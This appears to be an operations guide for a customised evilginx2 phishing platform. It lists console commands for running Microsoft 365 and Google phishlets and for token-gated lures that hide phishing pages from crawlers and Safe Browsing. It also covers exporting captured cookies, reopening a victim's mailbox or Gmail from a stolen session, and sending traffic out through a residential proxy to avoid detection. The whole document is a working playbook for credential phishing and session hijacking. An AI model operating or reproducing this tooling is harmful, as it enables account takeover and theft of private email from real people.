---
layout: default
title: Operations guide
---

# Operations guide

Everything a operator does day-to-day happens through **`tools/egconsole.py`** — a REPL
that speaks the node's mTLS API. Config lives in `tools/my-servers.json` (node list:
host, API port, stealth base path, client cert paths) and `tools/console.json`.

```bash
cd tools && python egconsole.py
# multi-node deployments: pick the node first
eg> use vps-node-1
```

---

## Phishlets

```text
phishlets                  list phishlets + enabled/disabled status
enable  <phishlet>         hot-enable (no service restart, certs handled by hot-reload)
disable <phishlet>         hot-disable
reload                     re-scan phishlet files from disk
hostname <phishlet> <host> change the phishlet base hostname
```

### Switching between phishlets (ms365 ⇄ google)

Both phishlets can share one base domain because their `phish_sub` values differ
(`accounts`/`login` vs `signin`/`gwww`). **Never let two enabled phishlets share the same
`phish_sub`** — the host→phishlet map is a Go map and collisions cause random
cross-redirects between flows.

Verified procedure — switching has *zero* impact on the other phishlet:

```text
eg> disable google        # response: 200 {'result': 'disable google ok'}
eg> ... run the ms365 campaign ...
eg> enable google         # back on, no restart, certs intact
```

You do not need to disable anything to use one phishlet — simply send the lure URL of the
one you want. Disabling is for exposure hygiene (e.g. park Google while hunting MS365).

## Lures

A lure is a campaign entry point: a path on the phishlet host plus a redirect target.
API-created lures get an automatic **token** (`?t=`) — requests without the correct token
are 302-redirected to a benign URL, so crawlers / Safe Browsing / link previews never see
the login page.

```text
lures                          list all lures (id, phishlet, path, redirect)
lure_create <pl> [redirect]    new lure for phishlet (token auto-generated)
lureurl <pl> <id> [k=v ...]    build the campaign URL (adds AES params: rid, email…)
lure_edit <id> k=v             change fields (redirect_url, relay, token, …)
lure_del <id>                  delete
```

Notes:

- `lureurl` prints the URL **without** the `?t=` token — read the token from the node
  config or via the API and append it yourself; treat it as a campaign secret.
- Relay lures (Google) are created with `relay: true`; the relay page is then served *at
  the lure path* (nice URL bar) while `/__relay/*` carries its XHR traffic.

## Sessions

```text
sessions                  list captured sessions (id, phishlet, user, cookie counts)
session <id>              detail: captured tokens/cookies per domain
session_del <id>          delete a session
export <id> [file]        export session (cookies + meta) to JSON
```

Every capture also hits the credential webhook if configured (`-webhook`), delivering JSON
with `password_sha256` and the gophish `rid` for campaign tracking.

### Reusing a captured session (mailbox reuse)

The point of the capture is a *living* session. Two proven ways:

1. **On the node** — `deploy/export_session_cookies.py` pulls cookies from the SQLite
   store; `tools/lib/session_launcher.py` opens a browser signed-in as the victim
   (gotcha: `__Host-` cookies need URL-based injection, not Playwright's url+path; headless
   Chromium to `login.live.com` may need `--disable-http2`).
2. **On the operator workstation** — for Google relay captures,
   `tools/relay/open_gmail_session.py` loads the relay capture JSON into the local Chrome
   (`playwright` channel="chrome") and opens Gmail signed-in.

## Upstream proxy

```text
proxy                                    show current proxy + routes
proxy set <type> <host> <port> <user> <pass> <routes>
proxy route add|del <suffix>             per-domain egress rules
proxy on | proxy off
```

`routes` is a comma-separated list of domain suffixes that must egress through the proxy
(e.g. `google.com,gstatic.com,googleusercontent.com`); everything else goes direct. This
is how the Google phishlet exits from a residential IP while ms365 stays direct. See
[proxy](proxy.md) for the full feature.

## Google relay operations

```text
tail [n]                  tail the evilginx service log (ANSI-stripped)
puppet <url> <user> <passfile>   drive evilpuppet against a capture
```

Relay-specific ops (capture inspection, session replay, self-testing) are documented in
[google-relay](google-relay.md). The golden rule: **self-test renders only** — never submit
fake credentials through the relay against Google; dozens of submissions burn the
residential exit's reputation ("This browser or app may not be secure") for 30–60 min.

## Changing source code (deploy flow)

Edit `src/` (or `tools/relay/`) locally, then one command syncs, builds on the
node, restarts both services and heartbeats the API:

```bash
SSH_ID=/path/to/key ./deploy/sync-node.sh [user@host]
```

Verify lures/sessions via egconsole or MCP before handing anything to users.

## Service checks on the node

```bash
systemctl status evilginx2        # proxy + API (:443, :9443)
systemctl status bgrelay          # relay sidecar (:9445) — google phishlet
journalctl -u evilginx2 -o cat | tail    # strip ANSI for readable logs
pgrep -c chromium                 # zombie browser check (relay sessions)
ls ~/bgrelay-store/               # relay captures (email+password+cookies JSON)
```
